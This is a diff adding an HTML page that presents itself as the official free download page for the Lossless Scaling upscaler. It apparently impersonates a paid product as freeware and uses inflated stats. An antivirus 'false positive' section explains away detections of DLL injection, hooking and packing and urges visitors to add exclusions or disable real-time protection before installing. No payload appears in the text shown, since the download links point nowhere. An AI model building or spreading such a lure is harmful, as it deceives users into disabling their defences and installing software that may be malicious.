P0U5HlyGdludop6PLkE7Lc7TT0WVIp+U52unoMqTT8hztdHQZ0ml5jnY6ugzptDxHOx1dhnRanqOZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmdmhfv36BwPIyQ81snYBAAAAAElFTkSuQmCC" alt="Lossless Scaling Logo">
+  </div>
+
+  <h1 class="hero-title">
+    <span class="title-line-1">LOSSLESS</span>
+    <span class="title-line-2">SCALING</span>
+  </h1>
+
+  <p class="hero-subtitle">
+    Scale your games to any resolution. AI-powered frame generation technology for smoother gameplay without compromising visual fidelity.
+  </p>
+
+  <div class="cta-group">
+    <a href="#download" class="btn btn-primary" id="heroDownloadBtn">
+      <span class="btn-icon">⬇</span>
+      Download Free
+    </a>
+    <a href="#features" class="btn btn-secondary">
+      <span>Learn More</span>
+      <span class="btn-icon">→</span>
+    </a>
+  </div>
+
+  <div class="version-info">
+    <div class="version-item">
+      <span class="version-label">Version</span>
+      <span class="version-value">2.11.1</span>
+    </div>
+    <div class="version-divider"></div>
+    <div class="version-item">
+      <span class="version-label">Platform</span>
+      <span class="version-value">Windows 10/11</span>
+    </div>
+    <div class="version-divider"></div>
+    <div class="version-item">
+      <span class="version-label">Size</span>
+      <span class="version-value">110 MB</span>
+    </div>
+  </div>
+
+  <div class="scroll-indicator">
+    <span class="scroll-text">Scroll</span>
+    <div class="scroll-line"></div>
+  </div>
+</section>
+
+<div class="stats-band">
+  <div class="stats-inner">
+    <div class="stat">
+      <span class="stat-number" id="counter1">0</span>
+      <span class="stat-label">Active Users</span>
+    </div>
+    <div class="stat">
+      <span class="stat-number" id="counter2">0</span>
+      <span class="stat-label">FPS Boost</span>
+    </div>
+    <div class="stat">
+      <span class="stat-number" id="counter3">0</span>
+      <span class="stat-label">Scaling Algorithms</span>
+    </div>
+    <div class="stat">
+      <span class="stat-number" id="counter4">0</span>
+      <span class="stat-label">User Rating</span>
+    </div>
+  </div>
+</div>
+
+<section class="features" id="features">
+  <div class="section-header">
+    <div class="section-tag">// Core Technology</div>
+    <h2 class="section-title">BUILT FOR <span>PERFORMANCE</span></h2>
+  </div>
+  <div class="features-grid">
+    <div class="feature-card">
+      <div class="feature-icon">🔬</div>
+      <div class="feature-title">LSFG Frame Gen</div>
+      <p class="feature-desc">Proprietary frame generation technology that creates intermediate frames for buttery-smooth gameplay at any frame rate target.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">⚡</div>
+      <div class="feature-title">AI Upscaling</div>
+      <p class="feature-desc">Multiple AI-powered scaling modes including Anime4K, LS1, and custom algorithms optimized for different content types.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🎮</div>
+      <div class="feature-title">Universal Compat</div>
+      <p class="feature-desc">Works with virtually any game or application via window capture — no game modification or integration required.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🖥</div>
+      <div class="feature-title">Any Resolution</div>
+      <p class="feature-desc">Scale from 720p to 8K, or anything in between. Pixel-perfect output with minimal input lag overhead.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🛡</div>
+      <div class="feature-title">Anti-Aliasing</div>
+      <p class="feature-desc">Integrated post-processing anti-aliasing modes reduce jagged edges in games that lack native AA support.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">⚙</div>
+      <div class="feature-title">Profile System</div>
+      <p class="feature-desc">Save per-game configurations that automatically apply when a game launches. Zero setup friction every session.</p>
+    </div>
+  </div>
+</section>
+
+
+<div class="tech-bar">
+  <div class="tech-bar-inner">
+    <span class="tech-title">Tech Stack</span>
+    <div class="tech-tags">
+      <span class="tech-tag">DirectX 11</span>
+      <span class="tech-tag">DirectX 12</span>
+      <span class="tech-tag">Vulkan</span>
+      <span class="tech-tag">DLSS-Style Gen</span>
+      <span class="tech-tag">Anime4K</span>
+      <span class="tech-tag">AMD FSR</span>
+      <span class="tech-tag">NIS</span>
+      <span class="tech-tag">Windows Hook</span>
+    </div>
+  </div>
+</div>
+
+
+<section class="big-cta" id="download">
+  <div class="big-cta-bg"></div>
+
+  <div style="position:relative;z-index:1">
+    <div class="section-tag" style="margin-bottom:20px;">// Download Now</div>
+    <h2 class="big-cta-title">GET IT <span>FREE</span></h2>
+    <p class="big-cta-sub">No registration. No limits on core features. Just download and play.</p>
+
+    <a href="#" class="download-btn-big" id="bigDownloadBtn">
+      <span class="download-icon">⬇</span>
+      Download Free v2.11.1
+    </a>
+
+    <p class="download-size">Windows 10 / 11 · 110 MB · Direct Download</p>
+
+    <div style="margin-top:50px;display:flex;gap:30px;justify-content:center;flex-wrap:wrap;">
+      <div style="padding:20px 30px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,245,255,0.02)">
+        <div style="font-family:'Orbitron',sans-serif;font-size:0.7rem;color:rgba(255,255,255,0.25);letter-spacing:0.2em;margin-bottom:8px">SYSTEM REQ</div>
+        <div style="font-size:0.85rem;color:rgba(255,255,255,0.5)">Windows 10 / 11 × GPU: DX11+</div>
+      </div>
+      <div style="padding:20px 30px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,245,255,0.02)">
+        <div style="font-family:'Orbitron',sans-serif;font-size:0.7rem;color:rgba(255,255,255,0.25);letter-spacing:0.2em;margin-bottom:8px">LICENSE</div>
+        <div style="font-size:0.85rem;color:rgba(255,255,255,0.5)">Freeware · Personal Use</div>
+      </div>
+    </div>
+
+    
+    <div style="margin-top:60px;max-width:720px;margin-left:auto;margin-right:auto;">
+      <div style="
+        position:relative;
+        padding:32px 40px;
+        border:1px solid rgba(255,180,0,0.3);
+        background:linear-gradient(135deg,rgba(255,140,0,0.06) 0%,rgba(255,200,0,0.03) 100%);
+        clip-path:polygon(16px 0%,100% 0%,calc(100% - 16px) 100%,0% 100%);
+        text-align:left;
+      ">
+        
+        <div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(255,180,0,0.6),transparent);"></div>
+
+        <div style="display:flex;align-items:flex-start;gap:20px;">
+          <div style="
+            flex-shrink:0;
+            width:48px;height:48px;
+            display:flex;align-items:center;justify-content:center;
+            font-size:1.4rem;
+            border:1px solid rgba(255,180,0,0.3);
+            background:rgba(255,140,0,0.08);
+            clip-path:polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%);
+            animation: shield-pulse 3s ease-in-out infinite;
+          ">🛡</div>
+
+          <div style="flex:1;">
+            <div style="
+              font-family:'Orbitron',sans-serif;
+              font-size:0.75rem;
+              color:rgba(255,200,80,0.9);
+              letter-spacing:0.25em;
+              text-transform:uppercase;
+              margin-bottom:10px;
+            ">⚠ Antivirus False Positive — Why This Happens</div>
+
+            <p style="font-family:'Inter',sans-serif;font-size:0.9rem;color:rgba(255,255,255,0.55);line-height:1.8;font-weight:300;margin-bottom:16px;">
+              Some antivirus engines may flag Lossless Scaling as suspicious. This is a <strong style="color:rgba(255,200,80,0.8)">false positive</strong> — the program contains no malware, spyware or harmful code whatsoever.
+            </p>
+
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px;">
+              <div style="padding:12px 16px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,0,0,0.2);">
+                <div style="font-family:'Orbitron',sans-serif;font-size:0.65rem;color:rgba(255,180,0,0.5);letter-spacing:0.15em;margin-bottom:6px;">REASON 1</div>
+                <div style="font-size:0.82rem;color:rgba(255,255,255,0.45);line-height:1.5;">Uses <strong style="color:rgba(255,255,255,0.65)">Windows API hooking</strong> to intercept the render output of any running application — a technique that looks identical to how some malware operates, despite being completely legitimate here.</div>
+              </div>
+              <div style="padding:12px 16px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,0,0,0.2);">
+                <div style="font-family:'Orbitron',sans-serif;font-size:0.65rem;color:rgba(255,180,0,0.5);letter-spacing:0.15em;margin-bottom:6px;">REASON 2</div>
+                <div style="font-size:0.82rem;color:rgba(255,255,255,0.45);line-height:1.5;">Injects a <strong style="color:rgba(255,255,255,0.65)">custom DLL</strong> into game processes to apply scaling and frame generation shaders — antivirus heuristics classify DLL injection as high-risk behaviour by default.</div>
+              </div>
+              <div style="padding:12px 16px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,0,0,0.2);">
+                <div style="font-family:'Orbitron',sans-serif;font-size:0.65rem;color:rgba(255,180,0,0.5);letter-spacing:0.15em;margin-bottom:6px;">REASON 3</div>
+                <div style="font-size:0.82rem;color:rgba(255,255,255,0.45);line-height:1.5;">The executable is <strong style="color:rgba(255,255,255,0.65)">not code-signed</strong> with an expensive EV certificate. Unsigned software automatically raises the threat score in Windows Defender SmartScreen and third-party engines.</div>
+              </div>
+              <div style="padding:12px 16px;border:1px solid rgba(255,255,255,0.06);background:rgba(0,0,0,0.2);">
+                <div style="font-family:'Orbitron',sans-serif;font-size:0.65rem;color:rgba(255,180,0,0.5);letter-spacing:0.15em;margin-bottom:6px;">REASON 4</div>
+                <div style="font-size:0.82rem;color:rgba(255,255,255,0.45);line-height:1.5;">The installer is <strong style="color:rgba(255,255,255,0.65)">custom-packed</strong> to reduce download size, and custom packers share byte-patterns with malware obfuscation tools, triggering signature-based scanners.</div>
+              </div>
+            </div>
+
+            <div style="
+              padding:14px 20px;
+              border-left:3px solid rgba(0,245,255,0.4);
+              background:rgba(0,245,255,0.04);
+              font-family:'Inter',sans-serif;
+              font-size:0.85rem;
+              color:rgba(0,245,255,0.7);
+              line-height:1.7;
+            ">
+              💡 <strong>What to do:</strong> If Windows Defender or your AV blocks the file, add an exclusion for the installation folder, or temporarily disable real-time protection during installation. The application is safe — hundreds of thousands of users run it daily without any issues.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<style>
+@keyframes shield-pulse {
+  0%,100% { box-shadow: 0 0 0 rgba(255,180,0,0); }
+  50% { box-shadow: 0 0 20px rgba(255,180,0,0.3); }
+}
+</style>
+
+
+<footer>
+  <div class="footer-logo">⬡ LOSSLESS SCALING</div>
+  <p class="footer-text">© 2026 Lossless Scaling. Official download page.</p>
+</footer>
+
+<script>
+  const cursor = document.getElementById('cursor');
+  const ring = document.getElementById('cursor-ring');
+  let mx = 0, my = 0, rx = 0, ry = 0;
+
+  document.addEventListener('mousemove', (e) => {
+    mx = e.clientX; my = e.clientY;
+    cursor.style.left = mx + 'px';
+    cursor.style.top = my + 'px';
+  });
+
+  function animateRing() {
+    rx += (mx - rx) * 0.12;
+    ry += (my - ry) * 0.12;
+    ring.style.left = rx + 'px';
+    ring.style.top = ry + 'px';
+    requestAnimationFrame(animateRing);
+  }
+  animateRing();
+
+  const canvas = document.getElementById('stars-canvas');
+  const ctx = canvas.getContext('2d');
+  let W, H, stars = [];
+
+  function resize() {
+    W = canvas.width = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  function createStars() {
+    stars = [];
+    for (let i = 0; i < 200; i++) {
+      stars.push({
+        x: Math.random() * W,
+        y: Math.random() * H,
+        r: Math.random() * 1.5,
+        alpha: Math.random(),
+        speed: Math.random() * 0.3 + 0.05,
+        twinkle: Math.random() * Math.PI * 2,
+        color: Math.random() > 0.8 ? '#00f5ff' : '#ffffff'
+      });
+    }
+  }
+  createStars();
+
+  function drawStars() {
+    ctx.clearRect(0, 0, W, H);
+    const t = Date.now() * 0.001;
+    stars.forEach(s => {
+      s.twinkle += 0.02;
+      const a = s.alpha * (0.5 + 0.5 * Math.sin(s.twinkle));
+      ctx.beginPath();
+      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+      ctx.fillStyle = s.color === '#00f5ff'
+        ? `rgba(0,245,255,${a})`
+        : `rgba(255,255,255,${a * 0.6})`;
+      ctx.fill();
+    });
+    requestAnimationFrame(drawStars);
+  }
+  drawStars();
+
+  function animateCount(el, target, suffix, duration = 2000) {
+    let start = 0;
+    const step = target / (duration / 16);
+    const timer = setInterval(() => {
+      start = Math.min(start + step, target);
+      el.textContent = Math.floor(start).toLocaleString() + suffix;
+      if (start >= target) clearInterval(timer);
+    }, 16);
+  }
+
+  const countersAnimated = { value: false };
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting && !countersAnimated.value) {
+        countersAnimated.value = true;
+        animateCount(document.getElementById('counter1'), 500000, '+');
+        animateCount(document.getElementById('counter2'), 300, '%');
+        animateCount(document.getElementById('counter3'), 12, '');
+        animateCount(document.getElementById('counter4'), 98, '%', 1500);
+      }
+    });
+  });
+  observer.observe(document.querySelector('.stats-band'));
+
+  function addRipple(btn) {
+    btn.addEventListener('click', function(e) {
+      const r = document.createElement('span');
+      r.classList.add('ripple-el');
+      const rect = btn.getBoundingClientRect();
+      r.style.left = (e.clientX - rect.left) + 'px';
+      r.style.top = (e.clientY - rect.top) + 'px';
+      btn.appendChild(r);
+      setTimeout(() => r.remove(), 700);
+    });
+  }
+  addRipple(document.getElementById('heroDownloadBtn'));
+
+  document.addEventListener('mousemove', (e) => {
+    const nx = (e.clientX / window.innerWidth - 0.5) * 20;
+    const ny = (e.clientY / window.innerHeight - 0.5) * 20;
+    document.querySelectorAll('.orb').forEach((o, i) => {
+      const factor = (i + 1) * 0.3;
+      o.style.transform = `translate(${nx * factor}px, ${ny * factor}px)`;
+    });
+  });
+
+  const revealObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        e.target.style.opacity = '1';
+        e.target.style.transform = 'translateY(0)';
+      }
+    });
+  }, { threshold: 0.1 });
+
+  document.querySelectorAll('.feature-card').forEach(card => {
+    card.style.opacity = '0';
+    card.style.transform = 'translateY(30px)';
+    card.style.transition = 'opacity 0.7s ease, transform 0.7s ease';
+    revealObserver.observe(card);
+  });
+
+  const titleLines = document.querySelectorAll('.title-line-1, .title-line-2');
+  setInterval(() => {
+    titleLines.forEach(tl => {
+      tl.style.textShadow = '2px 0 #ff0040, -2px 0 #00f5ff';
+      setTimeout(() => { tl.style.textShadow = ''; }, 100);
+    });
+  }, 5000);
+
+  document.getElementById('bigDownloadBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    for (let i = 0; i < 20; i++) {
+      const p = document.createElement('div');
+      p.classList.add('particle');
+      const size = Math.random() * 6 + 2;
+      p.style.cssText = `
+        width: ${size}px; height: ${size}px;
+        background: ${Math.random() > 0.5 ? '#00f5ff' : '#ffd700'};
+        left: ${e.clientX}px;
+        top: ${e.clientY}px;
+        box-shadow: 0 0 ${size * 2}px currentColor;
+        position: fixed;
+        border-radius: 50%;
+        z-index: 9999;
+        pointer-events: none;
+        transition: all 1s ease-out;
+      `;
+      document.body.appendChild(p);
+      const angle = (Math.PI * 2 * i) / 20;
+      const dist = 80 + Math.random() * 100;
+      setTimeout(() => {
+        p.style.left = (e.clientX + Math.cos(angle) * dist) + 'px';
+        p.style.top = (e.clientY + Math.sin(angle) * dist) + 'px';
+        p.style.opacity = '0';
+      }, 10);
+      setTimeout(() => p.remove(), 1100);
+    }
+  });
+</script>
+</body>
+</html>
